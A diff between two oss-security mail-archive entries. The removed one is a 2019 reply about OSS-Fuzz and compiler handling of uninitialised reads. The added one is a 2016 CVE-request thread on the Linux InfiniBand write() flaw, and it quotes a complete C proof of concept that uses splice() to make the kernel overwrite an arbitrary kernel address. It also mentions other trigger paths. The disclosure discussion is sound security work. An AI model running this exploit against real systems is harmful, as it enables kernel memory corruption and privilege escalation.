@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1319" "Tuesday" "25" "June" "2019" "07:14:52" "-0700" "Matthew Fernandez" "matthew.fernandez@gmail.com" "<2422A407-94F6-4AB2-9928-310C5089EA5D@gmail.com>" "23" "Re: [oss-security] Thousands of vulnerabilities, almost no CVEs: OSS-Fuzz" "^Date:" nil nil "6" "2019062514:14:52" "[oss-security] Thousands of vulnerabilities, almost no CVEs: OSS-Fuzz" (number mark "        matthew.fern Jun 25   23/1319  " thread-indent "\"Re: [oss-security] Thousands of vulnerabilities, almost no CVEs: OSS-Fuzz\"\n") "<alpine.GSO.2.20.1906250816590.2070@freddy.simplesystems.org>" ("<CAFRnB2UmyOiRV9fnMffcAtF4ruuJZwx=fg5X=hLbQjeFN=t3Bg@mail.gmail.com>" "<20190617113203.GH15432@suse.de>" "<CACT4Y+Zu1r10wKxjAbJqZ5rXc8eq5NRWjuNVPLHbwZGAem1OTg@mail.gmail.com>" "<alpine.GSO.2.20.1906241038470.23351@scrappy.simplesystems.org>" "<alpine.LRH.2.21.1906241152180.4597@fairfax.gathman.org>" "<E1hfSKS-00015J-V5@rmmprod07.runbox>" "<20190624193048.GA8039@espresso.pseudorandom.co.uk>" "<CAFRnB2XeQ-casQLm0MRCdRmQ5aeF9K=X3Km5eYg9DB6A915d5A@mail.gmail.com>" "<alpine.GSO.2.20.1906250816590.2070@freddy.simplesystems.org>") nil nil nil nil nil nil nil "Re: [oss-security] Thousands of vulnerabilities, almost no CVEs: OSS-Fuzz" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6035" "Monday" "9" "May" "2016" "21:39:55" "+0200" "Jann Horn" "jann@thejh.net" "<20160509193955.GA3317@pc.thejh.net>" "169" "Re: [oss-security] CVE Request: Linux: IB/security: Restrict use of the write() interface'" "^Cc:" nil nil "5" "2016050919:39:55" "[oss-security] CVE Request: Linux: IB/security: Restrict use of the write() interface'" (number mark "        jann@thejh.n May  9  169/6035  " thread-indent "\"Re: [oss-security] CVE Request: Linux: IB/security: Restrict use of the write() interface'\"\n") "<1462821041.4268.43.camel@opteya.com>" ("<20160507042232.GA5286@eldamar.local>" "<1462645186.4268.27.camel@opteya.com>" "<20160509180208.GB6372@pc.thejh.net>" "<1462821041.4268.43.camel@opteya.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 1444 invoked by uid 550); 25 Jun 2019 14:20:09 -0000
+Received: (qmail 28279 invoked by uid 550); 9 May 2016 19:39:32 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,77 +11,194 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 28519 invoked from network); 25 Jun 2019 14:15:07 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=from:content-transfer-encoding:mime-version:subject:date:references
-         :to:in-reply-to:message-id;
-        bh=vJmheMs20gQZ1TsII1KzgfBlESOAHJhEI34LnHF2Lc4=;
-        b=Q30mPhDgFw7wI2Nk+uzeOJ7m21fq7EE7MOpbVzGZO7AS+1ZGElhwwJ30dm4tSqQPOF
-         qUp+khw5tezWMlLmkMC39YSCE73W2PQIRRvjontiv4Sss5xnzh2fk+vQJyFfbM9BZfis
-         Bjoc/Xc/xd70faPDh5hXfD0ZETfr/clhZEYn3V9D3Jof3mT9aZgOId8K3HuF0ZKF3Ar5
-         SL42WVRaoBoYTAj/0nKMsynF1ZjAnHpYvloXZFQvWfsoxIu0qPzd5b3xb3JRvaqoZUbu
-         bmFHmXYOCNY/cvme6VII/o9JALmwEZtlye1YO8oRUGDbMXNCosA9rnBVk39wqf9qpdAx
-         V25g==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:from:content-transfer-encoding:mime-version
-         :subject:date:references:to:in-reply-to:message-id;
-        bh=vJmheMs20gQZ1TsII1KzgfBlESOAHJhEI34LnHF2Lc4=;
-        b=PXP64HAWgPf2ZU8xHj4yos3FElzVYh6qLNZiFzJtUXH1Ep4qTG+xbAnqqmob/aSSgB
-         MgjTJmD2jVMXvyzdkJS0SLhMXr+wQfdxhGCADrsXtsXk/fvqrpoeL6zCUGX5mkWUwOIa
-         w/mrIM2YSN4nvL2NI34Yg1nicX2Bku4amzESX6KjhQ+niIYZTTJLixgFWQ7NPo3ALMjn
-         zG0hcp2+hRp6avk/ByGILNeWag13W8DDW9CzS0QcUR/TvfcjT5xYYstlEUg5+eImfFZd
-         zXLQ5UI28dRDLyarVycTAUD1MXwCksX84ZCXeNLGqTApSEogTvpix4lncxsReh4nCwOr
-         1dQQ==
-X-Gm-Message-State: APjAAAU5AqD8CtsB+NOrNO0VBQGXKY1zdIi2e+zPqO7UnXI9TJooX9H6
-	7Vl846olndGlv8Lyn8cgNEoH5KXa
-X-Google-Smtp-Source: APXvYqxUvJzbz0GGLr8hyK6zfNtQmBjh/Oh+OU/g1kvVWw8V78rCijb4N236iKojXBLkJQDVsl0HmA==
-X-Received: by 2002:a17:90a:3aed:: with SMTP id b100mr32520892pjc.63.1561472094866;
-        Tue, 25 Jun 2019 07:14:54 -0700 (PDT)
-Content-Type: text/plain;
-	charset=utf-8
-Content-Transfer-Encoding: quoted-printable
-Mime-Version: 1.0 (Mac OS X Mail 11.5 \(3445.9.1\))
-References: <CAFRnB2UmyOiRV9fnMffcAtF4ruuJZwx=fg5X=hLbQjeFN=t3Bg@mail.gmail.com>
- <20190617113203.GH15432@suse.de>
- <CACT4Y+Zu1r10wKxjAbJqZ5rXc8eq5NRWjuNVPLHbwZGAem1OTg@mail.gmail.com>
- <alpine.GSO.2.20.1906241038470.23351@scrappy.simplesystems.org>
- <alpine.LRH.2.21.1906241152180.4597@fairfax.gathman.org>
- <E1hfSKS-00015J-V5@rmmprod07.runbox>
- <20190624193048.GA8039@espresso.pseudorandom.co.uk>
- <CAFRnB2XeQ-casQLm0MRCdRmQ5aeF9K=X3Km5eYg9DB6A915d5A@mail.gmail.com>
- <alpine.GSO.2.20.1906250816590.2070@freddy.simplesystems.org>
-In-Reply-To: <alpine.GSO.2.20.1906250816590.2070@freddy.simplesystems.org>
-Message-Id: <2422A407-94F6-4AB2-9928-310C5089EA5D@gmail.com>
-X-Mailer: Apple Mail (2.3445.9.1)
-Date: Tue, 25 Jun 2019 07:14:52 -0700
-From: Matthew Fernandez <matthew.fernandez@gmail.com>
+Received: (qmail 28256 invoked from network); 9 May 2016 19:39:31 -0000
+Message-ID: <20160509193955.GA3317@pc.thejh.net>
+References: <20160507042232.GA5286@eldamar.local>
+ <1462645186.4268.27.camel@opteya.com>
+ <20160509180208.GB6372@pc.thejh.net>
+ <1462821041.4268.43.camel@opteya.com>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha1;
+	protocol="application/pgp-signature"; boundary="HcAYCG3uE/tztfnV"
+Content-Disposition: inline
+In-Reply-To: <1462821041.4268.43.camel@opteya.com>
+User-Agent: Mutt/1.5.23 (2014-03-12)
+Cc: Jason Gunthorpe <jgunthorpe@obsidianresearch.com>,
+	Doug Ledford <dledford@redhat.com>, linux-rdma@vger.kernel.org,
+	oss-security@lists.openwall.com
+Date: Mon, 9 May 2016 21:39:55 +0200
+From: Jann Horn <jann@thejh.net>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Thousands of vulnerabilities, almost no CVEs:
- OSS-Fuzz
-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] CVE Request: Linux: IB/security: Restrict use of
+ the write() interface'
+To: Yann Droneaud <ydroneaud@opteya.com>
 
+--HcAYCG3uE/tztfnV
+Content-Type: text/plain; charset=iso-8859-1
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
 
-> On Jun 25, 2019, at 06:41, Bob Friesenhahn <bfriesen@simple.dallas.tx.us>=
- wrote:
+On Mon, May 09, 2016 at 09:10:41PM +0200, Yann Droneaud wrote:
+> [Cc:=A0oss-security@lists.openwall.com]
 >=20
-> * Consumption of uninitialized data (e.g. image data) which is not
->   used to make important decisions.  This is usually due to unhandled
->   cases or error handling which does not quit immediately.
+> Hi,
+>=20
+> Le lundi 09 mai 2016 =E0 20:02 +0200, Jann Horn a =E9crit=A0:
+> > On Sat, May 07, 2016 at 08:19:46PM +0200, Yann Droneaud wrote:
+> > > Le samedi 07 mai 2016 =E0 06:22 +0200, Salvatore Bonaccorso a =E9crit=
+=A0:
+> > > >=20
+> > > > =A0
+> > > > Jann Horn reported an issue in the infiniband stack. It has been
+> > > > fixed in v4.6-rc6 with commit
+> > > > e6bd18f57aad1a2d1ef40e646d03ed0f2515c9e3:
+> > > >=20
+> > > > https://git.kernel.org/linus/e6bd18f57aad1a2d1ef40e646d03ed0f2515c9=
+e3
+> > > >=20
+> > > > >=20
+> > > > >=20
+> > > > > IB/security: Restrict use of the write() interface
+> > > > > The drivers/infiniband stack uses write() as a replacement for
+> > > > > bi-directional ioctl().=A0=A0This is not safe. There are ways to
+> > > > > trigger write calls that result in the return structure that
+> > > > > is normally written to user space being shunted off to user
+> > > > > specified kernel memory instead.
+> > > > >=20
+> > > That's an interesting issue.
+> > >=20
+> > > I thought access_ok() done as part of copy_to_user() would protect
+> > > from such unwelcomed behavior. But it's not if the kernel invoke
+> > > write() handler outside of a user process.
+> > >=20
+> > > Anyway, as I don't see yet how to reproduce the issue, is there a
+> > > PoC available, I would be interested by a mean to trigger such
+> > > write().
+>=20
+> > Here is my writeup of the issue that I made quite a while ago - the
+> > timeline is missing some of the more recent stuff, but meh.
+> >=20
+> > =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D
+> >=20
+> >=20
+> > Here is a PoC that can be used to clobber data at arbitrary
+> > writable kernel addresses if the rdma_ucm module is loaded (without
+> > actually needing Infiniband hardware to be present):
+> >=20
+> > =3D=3D=3D=3D=3D
+> > #define _GNU_SOURCE
+> > #include=20
+> > #include=20
+> > #include=20
+> > #include=20
+> > #include=20
+> > #include=20
+> >=20
+> > #include=20
+> > #include=20
+> > #include=20
+> > #include=20
+> > #include=20
+> >=20
+> > #define RDMA_PS_TCP 0x0106
+> >=20
+> > // This method forces the kernel to write arbitrary data to the
+> > // target fd under set_fs(KERNEL_DS), bypassing address limit
+> > // checks in anything that extracts pointers from written data.
+> > int write_without_addr_limit(int fd, char *buf, size_t len) {
+> > =A0 int pipefds[2];
+> > =A0 if (pipe(pipefds))
+> > =A0=A0=A0=A0return -1;
+> > =A0 ssize_t len_ =3D write(pipefds[1], buf, len);
+> > =A0 if (len =3D=3D -1)
+> > =A0=A0=A0=A0return -1;
+> > =A0 int res =3D splice(pipefds[0], NULL, fd, NULL, len_, 0);
+> > =A0 int errno_ =3D errno;
+> > =A0 close(pipefds[0]);
+> > =A0 close(pipefds[1]);
+> > =A0 errno =3D errno_;
+> > =A0 return res;
+> > }
+> >=20
+> > int clobber_kaddr(unsigned long kaddr) {
+> > =A0 // open infiniband fd
+> > =A0 int fd =3D open("/dev/infiniband/rdma_cm", O_RDWR);
+> > =A0 if (fd =3D=3D -1)
+> > =A0=A0=A0=A0err(1, "unable to open /dev/infiniband/rdma_cm - maybe the =
+RDMA kernel module isn't loaded?");
+> >=20
+> > =A0 // craft malicious write buffer
+> > =A0 // structure:
+> > =A0 //=A0=A0=A0struct rdma_ucm_cmd_hdr hdr
+> > =A0 //=A0=A0=A0struct rdma_ucm_create_id cmd
+> > =A0 char buf[sizeof(struct rdma_ucm_cmd_hdr) + sizeof(struct rdma_ucm_c=
+reate_id)];
+> > =A0 struct rdma_ucm_cmd_hdr *hdr =3D (void*)buf;
+> > =A0 struct rdma_ucm_create_id *cmd =3D (void*)(buf + sizeof(struct rdma=
+_ucm_cmd_hdr));
+> > =A0 hdr->cmd =3D RDMA_USER_CM_CMD_CREATE_ID;
+> > =A0 hdr->in =3D 0;
+> > =A0 hdr->out =3D sizeof(struct rdma_ucm_create_id_resp);
+> > =A0 cmd->ps =3D RDMA_PS_TCP;
+> > =A0 cmd->response =3D kaddr;
+> >=20
+> > =A0 int res =3D write_without_addr_limit(fd, buf, sizeof(buf));
+> > =A0 int errno_ =3D errno;
+> > =A0 close(fd);
+> > =A0 errno =3D errno_;
+> > =A0 return res;
+> > }
+> >=20
+> > int main(int argc, char **argv) {
+> > =A0 if (argc !=3D 2)
+> > =A0=A0=A0=A0errx(1, "want one argument (kernel address to clobber)");
+> > =A0 char *endp;
+> > =A0 unsigned long kaddr =3D strtoul(argv[1], &endp, 0);
+> > =A0 if (kaddr =3D=3D ULONG_MAX || *endp || endp =3D=3D argv[1])
+> > =A0=A0=A0=A0errx(1, "bad input number");
+> >=20
+> > =A0 int r =3D clobber_kaddr(kaddr);
+> > =A0 if (r >=3D 0) {
+> > =A0=A0=A0=A0printf("that probably worked? clobber_kaddr(0x%lx)=3D%d\n",=
+ kaddr, r);
+> > =A0=A0=A0=A0return 0;
+> > =A0 } else {
+> > =A0=A0=A0=A0printf("failed: %m\n");
+> > =A0=A0=A0=A0return 1;
+> > =A0 }
+> > }
+>=20
+>=20
+> Is this only achievable through splice() ?
 
-C/C++ compilers will infer backwards from uninitialized variable reads (und=
-efined behavior in these languages) that preceding code is unreachable. For=
- example, when moving from GCC 6 series to GCC 7 series we found one of our=
- code bases would produce a binary that would only segfault when compiled a=
-t >=3D -O2. We root caused this to exactly the situation you describe: an e=
-rror handling path that read uninitialized variables. The compiler appeared=
- to infer backwards that the error check itself was a no-op as the true bra=
-nch led to unconditional UB (this is my interpretation of its actions; I di=
-d not delve into the compiler=E2=80=99s internals).
+sendfile() and the new copy_file_range() syscall (in kernel >=3D4.5) would
+probably both work, too - they all use the splice mechanism internally.
 
-I=E2=80=99m probably telling you things you already know and it sounds like=
- you don=E2=80=99t consider such issues worth addressing, but I just wanted=
- to point out that these are not theoretical. These cause real problems for=
- users and, for open source software, you may not have full control over wh=
-at toolchain/flags users build your code with.=
+ecryptfs also calls the VFS methods of the lower filesystem under KERNEL_DS
+iirc, it might also be possible to attack infiniband that way.
+
+--HcAYCG3uE/tztfnV
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: Digital signature
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBAgAGBQJXMOeLAAoJED4KNFJOeCOoGScP/2B+sm1QWBEb4c+Z53p3WnBF
+89WnjBc6E70x3zuC+GYUjqE6GpyUErG3U1iZt/YZiXuXfCjrPUEPmgh5eq7YPwhZ
+7gd79Bzv7xJsl/otzos0ZpvvC4YJXQIXb1LUyF/g1aVbaTXEVuWwj+kpT3DsqOZq
+AKlnzMInSWi1J7z8WYdwLoW5JEWWsRmDjAyPXar3Q1IcG8I3rfOyK4XmRwfo+i3L
++bltYEyEJg5aDct/5B3/3RGeaH6QfTLViUVk7M4dcWUtdjRYhu7vhqzUxtL8tSPg
+SQCIaOJgoNzUw/UNKcklDVxFcXA3CvGriDn1zZeGIWep5BLCMUOS/kgFocqKMm4Y
+oiIbwSGlRxhCo7klbMI5HaoF/QHEsv4Y3MGSWhQ6jJC3YP5pss3+qf2bLJXp8z2K
+NSD/4MbAzt4Vyysx4irrgM76XtK3CNtXFAkAfA0+JDk39o1USZv9W798bGyF882c
+ie7Q0O31y5cs282KtmMAW9jp1FXWy9pBir0cbDvSssXtsIzVJ4s+aH+A7u3S41Mr
+83mzW4RPN0V2FYfC5EbKgtW21PwaQAx1y5Ih4iXwZHx1I9UqKNEDhgHiRvxJws04
+yuCvNgMLVkseYbJ+eLGdDrwrHQoSqKZhopHG/O2OBRyYVzPnzrUb6HbltkCGjBsv
+ikZNdgRGO0I6pkG6iluq
+=mB61
+-----END PGP SIGNATURE-----
+
+--HcAYCG3uE/tztfnV--
